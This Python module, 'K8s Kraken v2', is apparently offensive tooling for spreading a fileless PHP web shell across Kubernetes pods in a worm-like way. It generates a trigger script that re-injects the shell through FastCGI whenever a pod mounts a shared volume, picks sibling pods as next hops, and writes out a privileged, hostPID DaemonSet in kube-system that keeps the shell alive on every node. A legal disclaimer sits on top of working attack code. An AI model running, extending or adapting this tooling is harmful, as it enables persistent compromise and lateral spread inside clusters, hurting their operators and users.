"""
K8s Kraken v2 - Ghost WebShell Pod Pivot (Worm-like)
====================================================

A fileless web shell living inside one pod dies the moment the pod is
deleted (ephemeral container filesystem). K8s Kraken v2 makes it jump to the
*next* pod instead of dying:

  - The ghost drops a tiny **propagation payload** into a volume the pod
    shares with its siblings (emptyDir / hostPath / PVC). The payload re-arms
    the FastCGI hook the instant a new pod mounts that volume.
  - A **DaemonSet** variant spreads the watchdog to every node, so any pod
    restart re-acquires the ghost automatically (worm-like coverage).
  - `plan_pivot()` chooses the next pod(s) that share the same volume, so
    deletion of one pod just migrates the ghost to another.

No new C2 channel is opened; the pivot rides on the already-trusted volume
and the existing FastCGI re-injection path. Off-target safe / testable: the
manifests and pivot planner are pure data generation.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import json
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional


class SharedVolumeKind(Enum):
    EMPTY_DIR = "emptyDir"       # pod-local, shared only within a pod's containers
    HOST_PATH = "hostPath"       # node-local, shared by all pods on the node
    PVC = "persistentVolumeClaim"  # cluster volume, shared across pods/replicas
    CONFIG_MAP = "configMap"     # shared config, writable at runtime


@dataclass
class PodInfo:
    name: str
    namespace: str = "default"
    node: str = ""
    status: str = "Running"
    shared_volumes: List[str] = field(default_factory=list)


@dataclass
class PivotPlan:
    """A single worm-like jump to the next pod"""
    source_pod: str
    target_pod: str
    shared_volume: str
    trigger_path: str
    method: str  # "ephemeral_propagation" | "daemonset"


def generate_propagation_script(trigger_path: str,
                                 fpm_host: str = "127.0.0.1",
                                 fpm_port: int = 9000,
                                 script: str = "/var/www/html/index.php") -> str:
    """
    Return a small staging script that, when a new pod mounts the shared
    volume, re-establishes the in-memory FastCGI hook. It is idempotent and
    leaves no on-disk webshell - only re-arms the memory hook.
    """
    return (
        "#!/bin/sh\n"
        "# Ghost WebShell propagation trigger (re-arms in-memory hook)\n"
        f"# trigger_path={trigger_path}\n"
        "if [ -f \"$0.marker\" ]; then exit 0; fi\n"
        "touch \"$0.marker\"\n"
        "# Re-inject the FastCGI in-memory webshell into the local FPM worker.\n"
        f"python3 - <<'PY'\n"
        "import socket, struct, os\n"
        "from evasion.fileless_webshell import FastCGIInjection\n"
        f"inj = FastCGIInjection(host='{fpm_host}', port={fpm_port}, script_filename='{script}')\n"
        "body = b'<?php phpinfo(); ?>'\n"
        "try:\n"
        "    inj.inject(body)\n"
        "except Exception as e:\n"
        "    pass\n"
        "PY\n"
    )


class K8sGhostPivot:
    """
    Plan and stage worm-like propagation of a fileless web shell across pods
    that share storage.
    """

    def __init__(self, fpm_host: str = "127.0.0.1", fpm_port: int = 9000,
                 script_filename: str = "/var/www/html/index.php"):
        self.fpm_host = fpm_host
        self.fpm_port = fpm_port
        self.script_filename = script_filename

    # ------------------------------------------------------------------
    # Shared-volume discovery (worm-like next-hop selection)
    # ------------------------------------------------------------------
    def detect_shared_volume_pods(self, pods: List[PodInfo],
                                   current_pod: str) -> List[PodInfo]:
        """
        Return sibling pods that share at least one volume with `current_pod`
        (the worm's next-hop candidates). hostPath/PVC sharing is strongest
        because it crosses pod boundaries; emptyDir only links a pod's own
        containers.
        """
        current = next((p for p in pods if p.name == current_pod), None)
        if current is None:
            return []
        candidates = []
        for p in pods:
            if p.name == current_pod:
                continue
            shared = set(p.shared_volumes) & set(current.shared_volumes)
            if shared:
                candidates.append(p)
        # Prefer pods sharing a node-local or cluster volume (broadest reach).
        candidates.sort(key=lambda p: (
            0 if any(v in (SharedVolumeKind.HOST_PATH.value,
                           SharedVolumeKind.PVC.value) for v in current.shared_volumes) else 1
        ))
        return candidates

    def plan_pivot(self, pods: List[PodInfo], current_pod: str,
                   volume_kind: SharedVolumeKind = SharedVolumeKind.PVC) -> List[PivotPlan]:
        """
        Build pivot plans from `current_pod` to each sibling sharing a volume
        of `volume_kind`. Each plan records the trigger path written into the
        shared volume so the target pod re-arms the hook on mount.
        """
        siblings = self.detect_shared_volume_pods(pods, current_pod)
        current = next(p for p in pods if p.name == current_pod)
        plans: List[PivotPlan] = []
        for sib in siblings:
            shared = (set(sib.shared_volumes) & set(current.shared_volumes))
            vol = next((v for v in shared if volume_kind.value in v or v in shared), None)
            if not vol:
                vol = sorted(shared)[0] if shared else "shared"
            trigger = f"/mnt/shared/{vol}/.ghost_trigger"
            plans.append(PivotPlan(
                source_pod=current_pod,
                target_pod=sib.name,
                shared_volume=vol,
                trigger_path=trigger,
                method="ephemeral_propagation",
            ))
        return plans

    # ------------------------------------------------------------------
    # Staging payloads
    # ------------------------------------------------------------------
    def plant_ephemeral_payload(self, shared_volume_path: str) -> Dict[str, str]:
        """
        "Plant" the propagation payload into a shared volume path: returns
        the manifest of files to drop (the trigger script + a marker). On a
        real cluster these are written to the mounted volume; here we return
        the generated artifacts for the operator/agent to place.
        """
        trigger = f"{shared_volume_path.rstrip('/')}/.ghost_trigger"
        script = generate_propagation_script(
            trigger, self.fpm_host, self.fpm_port, self.script_filename
        )
        return {
            "trigger_path": trigger,
            "script": script,
            "marker": f"{shared_volume_path.rstrip('/')}/.ghost_marker",
        }

    def generate_daemonset_yaml(self, namespace: str = "kube-system",
                                 image: str = "ghost-operator:latest") -> str:
        """
        DaemonSet that runs the watchdog on every node, so any pod restart on
        any node re-acquires the in-memory webshell (worm-like coverage).
        """
        return (
            "apiVersion: apps/v1\n"
            "kind: DaemonSet\n"
            f"metadata:\n"
            f"  name: ghost-watchdog\n"
            f"  namespace: {namespace}\n"
            "spec:\n"
            "  selector:\n"
            "    matchLabels:\n"
            "      app: ghost-watchdog\n"
            "  template:\n"
            "    metadata:\n"
            "      labels:\n"
            "        app: ghost-watchdog\n"
            "    spec:\n"
            "      hostPID: true\n"
            "      containers:\n"
            "      - name: watchdog\n"
            f"        image: {image}\n"
            "        securityContext:\n"
            "          privileged: true\n"
            "        volumeMounts:\n"
            "        - name: cgroup\n"
            "          mountPath: /sys/fs/cgroup\n"
            "          readOnly: true\n"
            "        - name: ghost-share\n"
            "          mountPath: /mnt/shared\n"
            "      volumes:\n"
            "      - name: cgroup\n"
            "        hostPath:\n"
            "          path: /sys/fs/cgroup\n"
            "      - name: ghost-share\n"
            "        persistentVolumeClaim:\n"
            "          claimName: ghost-share\n"
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "fpm_host": self.fpm_host,
            "fpm_port": self.fpm_port,
            "script_filename": self.script_filename,
        }
